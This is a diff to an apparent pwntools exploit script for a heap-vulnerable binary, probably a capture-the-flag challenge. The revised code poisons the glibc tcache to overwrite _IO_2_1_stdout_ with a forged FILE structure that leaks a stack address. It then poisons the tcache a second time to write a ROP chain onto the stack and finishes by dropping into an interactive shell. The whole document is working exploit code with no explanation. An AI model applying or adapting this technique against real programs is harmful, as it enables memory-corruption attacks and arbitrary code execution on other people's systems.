@@ -127,25 +127,32 @@ free(1)
 free(0)
 free(9)
 
-add(9, p64(0)+p64(0x51)+p64(mangle(heap, libc.sym.environ-0x18)))
+add(9, p64(0)+p64(0x51)+p64(mangle(heap, libc.sym._IO_2_1_stdout_)))
 add(0, b'test')
-add(1, b'a'*0x17)
-print(rop.dump())
-xorr(1)
-see(1)
-rcn(0x18)
-stack = bleak(rcn(6))
+
+pl = flat({
+    0: [
+        0xfbad1800,
+        libc.sym._IO_2_1_stdout_+131,
+        libc.sym._IO_2_1_stdout_+131,
+        libc.sym._IO_2_1_stdout_+131,
+        libc.sym._IO_2_1_stdout_+131,
+        libc.sym._IO_2_1_stdout_+131+0xa8-3,
+    ]
+})
+add(1, pl)
+
+stack = bleak(rcu(b'a - 1, b - 2')[-8:])
 
 free(2)
 free(0)
 free(9)
 
-add(9, p64(0)+p64(0x51)+p64(mangle(heap, stack-0x168)))
+add(9, p64(0)+p64(0x51)+p64(mangle(heap, stack-0x158)))
 add(0, b'test')
 
 # pause()
 
 add(1, p64(stack)+rop.chain())
-
 
 p.interactive()
